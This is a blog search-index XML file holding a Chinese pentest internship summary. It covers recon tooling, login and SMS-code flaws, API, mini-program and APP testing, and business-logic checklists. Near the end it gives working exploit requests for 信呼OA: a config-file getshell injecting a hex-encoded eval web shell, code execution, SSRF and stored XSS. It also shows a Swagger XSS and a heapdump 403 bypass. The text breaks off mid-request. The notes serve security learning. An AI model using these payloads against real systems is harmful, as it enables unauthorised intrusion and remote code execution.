<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实习小结</title>
      <link href="/2023/08/03/%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
      <url>/2023/08/03/%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><ul><li><p>靶场和实际环境</p><p>感觉靶场和实际渗透的环境一个很大的差别就是实际环境中有各种安全设备和其他防护。靶场中的各种应用环境都是默认的，直接拿着原本的payload就可以了，但在实际中开发很可能会进行二次开发，又或者做出一些防御手段，这就导致了payload应该怎么变化去打，又或者是知道某种情况下对方已经从源头防御了，无需花费精力去尝试。</p></li><li><p>渗透测试（太菜了😭）</p><p>测试测试就是要勇于尝试，细心和耐心（还是整个checklist好了，有些老是忘）</p><p>自动化提升效率（一些常用的操作就应该脚本自动化）</p><p>一定的开发能力（开发或者二开工具脚本的能力）</p><p>多看报告，文章来拓展思路</p><p>多复现漏洞</p></li></ul><h1 id="外网简化流程"><a href="#外网简化流程" class="headerlink" title="外网简化流程"></a>外网简化流程</h1><ul><li><p>公司到域名：enscan，icp-domains</p></li><li><p>子域名收集：oneforall（子域名爆破耗时，某些情况下可以选择不使用）+ 零零信安 </p><blockquote><p>域名可以再用altdns跑一下</p></blockquote></li><li><p>IP</p><ul><li><p>CDN识别：FCDN</p></li><li><p>域名→IP→C段：CIPR </p></li><li><p>端口扫描：Goby</p></li></ul></li><li><p>URL</p><ul><li><p>验活：httpx</p></li><li><p>指纹识别：Ehole，chunsou</p></li></ul></li><li><p>漏洞扫描：AWVS，XPOC，Afrog，nuclei</p></li><li><p>目录扫描：dirsearch，Arl</p></li><li><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  nday</span><br><span class="line">  弱口令</span><br><span class="line">  接口测试</span><br><span class="line">  逻辑漏洞</span><br><span class="line">  代码审计</span><br><span class="line">  联动xray</span><br><span class="line">小程序</span><br><span class="line">  app</span><br></pre></td></tr></table></figure></li></ul><h1 id="常见点渗透思路"><a href="#常见点渗透思路" class="headerlink" title="常见点渗透思路"></a>常见点渗透思路</h1><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><blockquote><p>TIP：后台处有多个接口系统，当访问不同的接口系统时发现网站的图标发生了变化。</p></blockquote><ul><li><p>接口测试：SuperSearchPlus，PackFuzzer（最好先登录，看一下BaseDir（js中查找base，api，path）；进了后台也可以收集更多的接口进行未授权测试）</p></li><li><p>敏感文件扫描</p></li><li><p>前端源码泄漏：sourcemap</p></li><li><p>JS中的敏感信息：HAE，SuperSearchPlus，Urlfinder</p></li><li><p>弱口令</p></li><li><p>sql注入</p></li><li><p>逻辑漏洞</p><ul><li>验证码问题</li><li>登录，注册，修改密码问题</li></ul></li><li><p>后台XSS</p></li><li><p>其他相同站点：指纹提取，fofa</p></li><li><p>其他域名测试</p></li></ul><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><ul><li><p>能枚举用户名就先枚举</p></li><li><p>图片验证码绕过</p><p><a href="https://github.com/f0ng/captcha-killer-modified/blob/main/FAQ.md">captcha-killer-modified&#x2F;FAQ.md at main · f0ng&#x2F;captcha-killer-modified</a></p><p><a href="https://www.cnblogs.com/4geek/p/17145385.html#!comments">【Security】利用Burp Suite爆破带有验证码Web登录接口（保姆级教程） - 为极客而生 - 博客园</a></p></li><li><p>数据包加密</p><ul><li><p>破解</p><p><a href="https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">快速定位前端加密方法 | 回忆飘如雪</a></p><p><a href="https://blog.wanghw.cn/security/burpcrypto-single-parameter-cryptoblast.html">BurpCrypto: 对单加密参数的登录接口进行密码爆破的一种方法 – Whwlsfb’s Tech Blog</a></p></li><li><p>输入一些常见的弱口令，收集加密后的值，然后固定密码，爆破用户名</p></li><li><p>无验证码的可以使用selenium模块模拟手动提交绕过</p></li></ul></li><li><p>同一个公司的站点的账号和密码用于撞库</p></li><li><p>社工字典生成（还没利用过😅）</p><p>需要先收集一下网站文章的作者名，邮箱，公司名，工号等信息</p></li></ul><h2 id="401，403，404"><a href="#401，403，404" class="headerlink" title="401，403，404"></a>401，403，404</h2><ul><li><p>403,404目录扫描，一层一层路由fuzz</p><p>TIP：目录可能为域名的一部分，公司的缩写，api，xxx-api等</p></li><li><p>401，403bypass</p><p><a href="https://github.com/0x727/BypassPro">0x727&#x2F;BypassPro: 对权限绕过自动化bypass的burpsuite插件 (github.com)</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">403 /actuator/heapdump</span><br><span class="line">200 /actuator/heapdump;.js</span><br></pre></td></tr></table></figure></li></ul><p>burpfakeIP</p><p>  <img src="/../images/image-20230911095606358.png" alt="image-20230911095606358"></p><p>  <img src="/../images/image-20230911095617521.png" alt="image-20230911095617521"></p><h2 id="云安全"><a href="#云安全" class="headerlink" title="云安全"></a>云安全</h2><p>强烈推荐teamssix.com师傅搭建的<a href="https://wiki.teamssix.com/">T Wiki</a></p><h3 id="存储桶"><a href="#存储桶" class="headerlink" title="存储桶"></a>存储桶</h3><blockquote><p>感觉碰到比较多的是遍历，put上传和SecretKey泄漏</p></blockquote><ul><li><p>Bucket 爆破：InvalidBucketName 和 NoSuchBucket</p></li><li><p>Bucket 接管：NoSuchBucket</p><p>类似于子域名接管，只是cname指向的是Bucket</p><p><img src="/../images/f8c5eeb73755688f1aaa2701080ea3a6.png" alt="WeiyiGeek."></p><blockquote><p>因为域名（源域名）配置了CNAME，但是CNAME指向的域名并没有被注册。那么攻击者可以注册这个CNAME指向的域名，就可以控制了源域名。</p><p>因为域名配置了CNAME，但是CNAME指向的Bucket没有被注册（被删除了），那么攻击者可以注册这个CNAME指向的Bucket，从而接管该域名。</p><p>参考文章：<a href="https://kebingzao.com/2021/06/21/s3-subdomain-takeover/">记一次因为 S3 bucket 删除而导致的子域名接管(subdomain takeover)的安全问题 | Zach Ke’s Notes (kebingzao.com)</a></p></blockquote></li><li><p>Bucke遍历</p></li><li><p>PUT上传文件</p></li><li><p>策略可访问&#x2F;修改（&#x2F;?acl）</p></li></ul><p>可以关注一下静态文件是不是从其他域名引入的，一般从其他域名引入的就是从存储桶引入的。</p><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>如何判断是否在docker容器内</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /.dockerenv</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114550082.png" alt="image-20230901114550082"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901114605623.png" alt="image-20230901114605623"></p><p>docker容器逃逸检测脚本<a href="https://github.com/teamssix/container-escape-check">teamssix&#x2F;container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com)</a></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ul><li><p>探测是否实体编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>123<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文件上传xss</p></li><li><p>用户名xss</p></li></ul><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><h3 id="短信验证码"><a href="#短信验证码" class="headerlink" title="短信验证码"></a>短信验证码</h3><ul><li><p>短信轰炸</p><ul><li><p>绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+86</span><br><span class="line">多手机号参数</span><br></pre></td></tr></table></figure></li></ul></li><li><p>暴力破解</p></li><li><p>验证码复用</p></li><li><p>内容伪造</p><img src="../images/image-20230907222706136.png" alt="image-20230907222706136" style="zoom:50%;" /></li><li><p>任意用户注册&#x2F;登录&#x2F;密码重置</p><ul><li><p>服务端回显</p></li><li><p>绑定关系失效</p><blockquote><p>用自己手机接收到的验证码和他人的手机号通过校验</p></blockquote></li><li><p>短信分发</p><blockquote><p>一次发送给多个手机号并且收到的验证码是相同的</p></blockquote><img src="../images/image-20230907222537516.png" alt="image-20230907222537516" style="zoom: 33%;" /></li><li><p>测试验证码</p><blockquote><p>配合测试手机号或正常手机号</p></blockquote></li></ul></li></ul><p><a href="https://mp.weixin.qq.com/s/a03-z_dk21DhbG025aqAeg">盘点图形验证码的漏洞挖掘方式，看完之后你还不会挖吗？</a></p><h2 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h2><blockquote><p>TIP：很多API接口文档都藏在二级，三级甚至四级目录下（druid什么的也是），推荐使用burp被动扫描<a href="https://github.com/F6JO/RouteVulScan">F6JO&#x2F;RouteVulScan: Burpsuite - Route Vulnerable Scanning 递归式被动检测脆弱路径的burp插件 (github.com)</a></p><p>扫描出来后可以使用APIKit，readapi等进行接口测试</p><p>APIkit的缺点：不能使用原始请求头，只保留了Cookie，被动扫描不能关闭，主动扫描只能先扫，再探测接口</p></blockquote><p><a href="https://mp.weixin.qq.com/s/F5x33TfY2WsJNLkS7nIsSg">API安全学习笔记</a></p><p><a href="https://mp.weixin.qq.com/s/e9x206e8EGBMPn_VGjrM1Q">API接口安全测试方法大全（附一键化扫描工具）</a></p><p><a href="https://half90.top/2022/07/13/graphql-gong-ji-mian-zong-jie/#toc-heading-8">GraphQL攻击面总结 | half90’s blog</a></p><ul><li><p>VUE</p><p><a href="https://mp.weixin.qq.com/s/1Fx68ENCUatgKV4qWQkeqA">vue站点渗透技巧及实战到getshell</a></p></li><li><p>Swagger接口</p><blockquote><p>通常看到Spring都可以进行Swagger接口的扫描</p></blockquote><p>接口测试工具：<a href="https://github.com/lijiejie/swagger-exp">lijiejie&#x2F;swagger-exp: A Swagger API Exploit</a></p><ul><li><p>swagger-ui界面的xss</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json</span><br></pre></td></tr></table></figure></li><li><p>接口文档可能不止一个</p><p>加载了swagger-resources中的文档地址</p><p><img src="/../images/image-20230905205724346.png" alt="image-20230905205724346"></p></li></ul></li><li><p>webpack</p><p><a href="https://www.anquanke.com/post/id/278158">渗透测试之只有一个登录框-安全客 - 安全资讯平台</a></p><p><a href="https://github.com/rtcatc/Packer-Fuzzer">rtcatc&#x2F;Packer-Fuzzer: Packer Fuzzer is a fast and efficient scanner for security detection of websites constructed by javascript module bundler such as Webpack.</a></p></li><li><p>webservice接口</p><p><a href="https://www.wangan.com/p/7fy7f3d8a78c477a">干货 | 最全Web Service渗透测试总结 - 网安</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5ODgwMjk3Mw==&mid=2247485031&idx=1&sn=810dcd19792a4e69f0bc8227d5b67f4e&chksm=908d4a15a7fac3031e12cdc8eac7368d2f86de9bf1448772b11fbdf8244253066b113e6b4280&scene=126&sessionid=1652766176&key=aedb5dc6521c3eeef8c44b90b02bdc6c4a078c543b030e55cc977b76de15b86657235c6e261df68e473334c1a6c1dcd2b97c5ee58db046fecd683bcd5392397956f68573f6dbbfcd4c67c53a21e77777052ec4e054fd73a0d32259a3d8013472e85d5fecfc70d499110c95851b834a090ed67ed2abe99704fe9d3e777c582559&ascene=1&uin=NTY2NTA4NjQ=&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&session_us=gh_4e2eb537c025&exportkey=Azu8V29RZO1SxJjNkfW3mgQ=&acctmode=0&pass_ticket=q6q+mc6ivpszLlqTfAZLXzOs7zft/67CwXhL8r4eAPGNjSqw0ZTdOCIQ72CMXJ2f&wx_header=0&fontgear=2">ReadyAPI-x32-2.8.2及破解文件</a></p><p><img src="/../images/image-20230829114309049.png" alt="image-20230829114309049"></p><p>扫描完成后，会生成PDF报告</p><p><img src="/../images/image-20230829114529740.png" alt="image-20230829114529740"></p><p><img src="/../images/image-20230829114701973.png" alt="image-20230829114701973"></p></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://fgtbnc.github.io/2023/06/01/JWT%E4%BB%A4%E7%89%8C/">JWT安全 | Khaz (fgtbnc.github.io)</a></p><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>万物皆可并发</p><p><img src="/../images/image-20230826174437969.png" alt="image-20230826174437969"></p><h2 id="微信小程序和公众号"><a href="#微信小程序和公众号" class="headerlink" title="微信小程序和公众号"></a>微信小程序和公众号</h2><blockquote><p>这两有的会校验数据包中的User-Agent，所以用一些扫描工具的时候要带上对应的User-Agent才行</p><p><img src="/../images/image-20230828114848695.png" alt="image-20230828114848695"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 公众号</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090621) XWEB/8287 Flue</span><br><span class="line"></span><br><span class="line"># 小程序</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8287</span><br></pre></td></tr></table></figure></blockquote><h3 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h3><h4 id="小程序结构"><a href="#小程序结构" class="headerlink" title="小程序结构"></a>小程序结构</h4><p><a href="https://kangzubin.com/wxapp-decompile-2/">微信小程序“反编译”实战（二）：源码还原 | 彬彬的博客 (kangzubin.com)</a></p><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>PC：proxifier+burp</p><p>Android：同一个局域网下，wifi代理+burp</p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p><strong>注意点：进入小程序后，先把各种功能点点，加载更多的程序之后再进行反编译</strong></p><p>小程序打开时</p><p><img src="/../images/image-20230904221313214.png" alt="image-20230904221313214"></p><p>打开点点点之后，点了一部分后就多了3MB</p><p><img src="/../images/image-20230904221135890.png" alt="image-20230904221135890"></p><ul><li><p>PC</p><p>需要先解密，再反编译，小程序文件位置如下</p><p><img src="/../images/image-20230730143531751.png" alt="image-20230730143531751"></p></li><li><p>Android</p><p>直接反编译即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/df69765be7b6e4a441a86a25d26e861f/appbrand/pkg/_-1486048203_3.wxapkg</span><br></pre></td></tr></table></figure></li></ul><h4 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h4><p><img src="/../images/%E5%B0%8F%E7%A8%8B%E5%BA%8FWEB%E6%BC%8F%E6%B4%9E_resultat.png" alt="image-20200508220108393"></p><h4 id="反编译调试"><a href="#反编译调试" class="headerlink" title="反编译调试"></a>反编译调试</h4><h5 id="报错修复"><a href="#报错修复" class="headerlink" title="报错修复"></a>报错修复</h5><p><img src="/../images/image-20230904215939364.png" alt="image-20230904215939364"></p><p><img src="/../images/image-20230904215953140.png" alt="image-20230904215953140"></p><p>wxml文件（样式文件）报错修复：直接删除</p><p>插件修复：遇到不需要使用的插件直接删除，要用到的插件去官方后台添加</p><h5 id="流量加密调试"><a href="#流量加密调试" class="headerlink" title="流量加密调试"></a>流量加密调试</h5><h5 id="签名绕过调试"><a href="#签名绕过调试" class="headerlink" title="签名绕过调试"></a>签名绕过调试</h5><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.hackinn.com/index.php/archives/672/">微信小程序的渗透五脉 - Hack Inn</a></p><p><a href="https://forum.butian.net/share/1227">奇安信攻防社区-浅谈微信小程序渗透</a></p><p><a href="https://developers.weixin.qq.com/community/minihome/list/1591986099080445956/2">安全中心公告 | 微信开放社区</a></p><p><a href="https://mp.weixin.qq.com/s/KfhgP97alL_d8mmOY4z44w">反编译&amp;调试小程序请求签名 (qq.com)</a></p><h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><p>跟web思路一样，注意UA头即可</p><h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li><p>夜神模拟器</p></li><li><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a>：在线分析APP，也可以用docker搭建</p></li><li><p><a href="https://github.com/kelvinBen/AppInfoScanner">APP域名提取</a></p></li><li><p><a href="https://github.com/sulab999/AppMessenger">sulab999&#x2F;AppMessenger: 一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS)辅助分析工具</a></p></li><li><p>apktool</p></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>由于找不到adbwinapi.dll,无法继续执行代码。重新安装程序可能会解决此问题</p><p>环境变量问题</p><p>解：将adb.exe文件复制到Windows&#x2F;system32下;</p><p>​       将adbwinapi.dll复制到Windows&#x2F;sysWoW64下。</p></li></ul><p><img src="/../images/image-20230725151602776.png" alt="image-20230725151602776"></p><p>​解决</p><p><img src="/../images/image-20230725151520659.png" alt="image-20230725151520659"></p><p><img src="/../images/image-20230725151508246.png" alt="image-20230725151508246"></p><p>​更改名字，替换模拟器中的adb即可,成功截图</p><p><img src="/../images/image-20230725151826056.png" alt="image-20230725151826056"></p><h3 id="ADB使用"><a href="#ADB使用" class="headerlink" title="ADB使用"></a>ADB使用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb devices # 列出设备</span><br><span class="line">adb connect 127.0.0.1:62001   # 连接设备</span><br><span class="line">adb shell whoami  # 查看当前用户</span><br><span class="line">adb shell pm list packages # 查看应用列表</span><br><span class="line">adb shell pm list packages -e -3  # 查询设备上所有已启用的第三方应用程序的包名列表</span><br><span class="line">adb shell getprop ro.build.version.release  # 安卓系统版本</span><br><span class="line">adb push  pc_file android_path  # 上传文件</span><br><span class="line">adb pull android_file pc_path # 下载文件</span><br></pre></td></tr></table></figure><h3 id="抓包绕过"><a href="#抓包绕过" class="headerlink" title="抓包绕过"></a>抓包绕过</h3><h4 id="ssl证书校验–HTTP单向认证"><a href="#ssl证书校验–HTTP单向认证" class="headerlink" title="ssl证书校验–HTTP单向认证"></a>ssl证书校验–HTTP单向认证</h4><ul><li><p>安卓7.0以下</p><p>直接安装burp.cer证书，配置wifi代理即可抓包</p></li><li><p>安卓7.0及以上</p><p>不同点在于使用adb安装burp证书的pem格式</p></li></ul><h4 id="代理屏蔽"><a href="#代理屏蔽" class="headerlink" title="代理屏蔽"></a>代理屏蔽</h4><blockquote><p>有的app做完ssl证书校验后，为了防止被抓包，多做了一层处理，给app设置自己的代理地址，可能这个代理地址就是服务器的地址，这样就不走我们设置的wifi代理，自然burp也抓不到包了。</p></blockquote><p>使用postern设置VPN代理绕过</p><ul><li>配置代理</li></ul><p><img src="/../images/image-20230904134750565.png" alt="image-20230904134750565"></p><p><img src="/../images/image-20230904134724524.png" alt="image-20230904134724524"></p><ul><li><p>配置规则</p><p><img src="/../images/image-20230904134947248.png" alt="image-20230904134947248"></p></li><li><p>需要<strong>关闭wifi代理</strong>，使用Postern的Vpn代理</p><p><img src="/../images/image-20230904135053270.png" alt="image-20230904135053270"></p></li></ul><h4 id="SSL-Pinning"><a href="#SSL-Pinning" class="headerlink" title="SSL-Pinning"></a>SSL-Pinning</h4><blockquote><p>SSL-pinning有两种方式： 证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。</p><ul><li><strong>证书锁定</strong> 需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在 证书续期后需要将证书重新内置到APP中。</li><li><strong>公钥锁定</strong> 提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。</li></ul></blockquote><p>使用<strong>xposed框架中的JustTrustMe</strong></p><h3 id="测试checklist"><a href="#测试checklist" class="headerlink" title="测试checklist"></a>测试checklist</h3><h4 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jarsigner -verify -certs -verbose apk</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230904114950022.png" alt="image-20230904114950022"></p><p>jadx-gui</p><p><img src="/../images/image-20230904115047184.png" alt="image-20230904115047184"></p><h4 id="客户端程序保护"><a href="#客户端程序保护" class="headerlink" title="客户端程序保护"></a>客户端程序保护</h4><blockquote><p>测试客户端安装程序，判断是否能反编译为源代码，是否存在代码混淆等保护措施。</p></blockquote><p>直接使用jadx-gui打开即可</p><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjUzNzg4Ng==&mid=2247483971&idx=1&sn=f4c726acbb472303b63c78bc442dddc8&chksm=ce481ab2f93f93a4cd3ba0cc1f66a6e98b25c6be28aacb19b0d228cb549967518d60da3858f3&cur_album_id=2988852703969787904&scene=189#wechat_redirect">App防抓包有四种绕过方法（详细）</a></p><p><a href="https://zhuanlan.zhihu.com/p/36538699">如何使用Xposed+JustTrustMe来突破SSL Pinning - 知乎</a></p><h2 id="业务安全"><a href="#业务安全" class="headerlink" title="业务安全"></a>业务安全</h2><h3 id="业务梳理"><a href="#业务梳理" class="headerlink" title="业务梳理"></a>业务梳理</h3><p>可以先将业务主体划分为几个大模块，再将每个大模块逐个细分为子模 块。</p><p>可以从账号体系开始，如用户的注册、登录、密码找回、信息存储等。</p><p>再到具体的业 务办理，如商品的搜索、选择、支付、生成订单，以及订单查询和用户评论等。</p><p><img src="/../images/image-20230713141756097.png" alt="image-20230713141756097"></p><p>​再根据业务场景梳理出流程图</p><p><img src="/../images/image-20230713141918648.png" alt="image-20230713141918648"></p><p><img src="/../images/image-20230713134331110.png" alt="image-20230713134331110"></p><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p><img src="/../images/image-20230713134200584.png" alt="image-20230713134200584"></p><h3 id="测试checklist-1"><a href="#测试checklist-1" class="headerlink" title="测试checklist"></a>测试checklist</h3><ul><li><p>登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">暴力破解</span><br><span class="line">session</span><br><span class="line">cookie</span><br><span class="line">用户名枚举</span><br><span class="line">任意用户登录</span><br></pre></td></tr></table></figure></li><li><p>注册</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户注册覆盖</span><br><span class="line">用户名枚举</span><br><span class="line">用户名xss</span><br><span class="line">任意用户注册</span><br></pre></td></tr></table></figure></li><li><p>访问控制</p><blockquote><p>常见的是通过数字遍历，不过最好注册两个账号来进行对比发现规律，更少遗漏</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">水平越权</span><br><span class="line">垂直越权</span><br></pre></td></tr></table></figure></li><li><p>支付问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">金额篡改</span><br><span class="line">编号篡改</span><br><span class="line">数量篡改</span><br><span class="line">购买限制绕过</span><br><span class="line">并发</span><br></pre></td></tr></table></figure></li><li><p>验证码问题</p></li><li><p>密码重置问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session覆盖（session校验身份）</span><br><span class="line">密码重置链接（弱Token:时间戳，uid加密/编码   uid:任意重置其他用户）</span><br><span class="line">修改用于校验的手机号/邮箱</span><br><span class="line">验证码问题</span><br></pre></td></tr></table></figure></li><li><p>通用型</p><ul><li><p>请求提交后由前端进行校验，此时可以拦截返回包，修改返回包中的内容，从而通过校验。</p></li><li><p>先进入后台界面，再弹出校验界面，可以尝试drop掉该校验数据包</p></li><li><p>多流程跳过</p><p>比如</p><p>（1）用户输入找回密码的账号；<br>（2）校验凭证：向用户发送短信验证码或者找回密码链接，用户回填验证码或单击<br>链接进入密码重置页面，以此方式证明当前操作用户是账号主人；<br>（3）校验成功进入重置密码页面。</p><p>找出最后一步重置密码的接口，接着使用URL测试是否可以跳过验证身份环节。</p></li></ul></li></ul><h1 id="碰到的应用不完全记录"><a href="#碰到的应用不完全记录" class="headerlink" title="碰到的应用不完全记录"></a>碰到的应用不完全记录</h1><table><thead><tr><th align="center">CMS</th><th align="center">阿里系</th><th align="center">JAVA</th><th align="center">国内软件</th><th align="center">数据库</th><th align="center">API</th><th align="center">云相关</th></tr></thead><tbody><tr><td align="center">Laravel</td><td align="center">druid monitor</td><td align="center">fastjson</td><td align="center">畅捷</td><td align="center">常见数据库</td><td align="center">Wsdl接口</td><td align="center">OSS</td></tr><tr><td align="center">ThinkPHP</td><td align="center">Nacos</td><td align="center">log4j</td><td align="center">海康威视</td><td align="center">Redis</td><td align="center">Swagger接口</td><td align="center">docker逃逸</td></tr><tr><td align="center">Drupal</td><td align="center">hessian组件</td><td align="center">JDBC MYSQL</td><td align="center">各种OA</td><td align="center">ES</td><td align="center">Webpack</td><td align="center">Minio</td></tr><tr><td align="center">DeadCMS</td><td align="center"></td><td align="center">Weblogic</td><td align="center">H3C</td><td align="center">MQTT（物联网协议）</td><td align="center">GraphQL</td><td align="center">Harbor</td></tr><tr><td align="center">Wordpress</td><td align="center"></td><td align="center">shiro</td><td align="center">金蝶云星空</td><td align="center"></td><td align="center"></td><td align="center">Rancher</td></tr><tr><td align="center">Joomla</td><td align="center"></td><td align="center">spring</td><td align="center">jeecg-boot</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">JBOSS</td><td align="center">若依</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">帆软</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">VUE</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="信呼OA"><a href="#信呼OA" class="headerlink" title="信呼OA"></a>信呼OA</h3><ul><li><p>后台文件上传</p><p><img src="/../images/image-20230901104539733.png" alt="image-20230901104539733"></p><p><img src="/../images/image-20230901104908007.png" alt="image-20230901104908007"></p><p>还原文件</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=19</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104840680.png" alt="image-20230901104840680"></p></li><li><p>后台配置文件getshell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;style=<span class="number">21</span>,id=<span class="number">1</span>,name=<span class="number">0x610A6576616C28245F504F53545B315D293B2F2F</span></span><br></pre></td></tr></table></figure><p>重新登陆</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;rnd=<span class="number">705961</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901110753588.png" alt="image-20230901110753588"></p><p>代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php</span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104430670.png" alt="image-20230901104430670"></p><p>注意：用了这个后台主页会出现问题</p></li><li><p>后台SSRF</p><p>保存请求</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?a=setsave&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">host</span>=http://<span class="literal">on</span>j888.dnslog.cn</span></span><br></pre></td></tr></table></figure><p>发送请求</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?a=testsends&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure></li><li><p>前台存储型XSS漏洞</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span 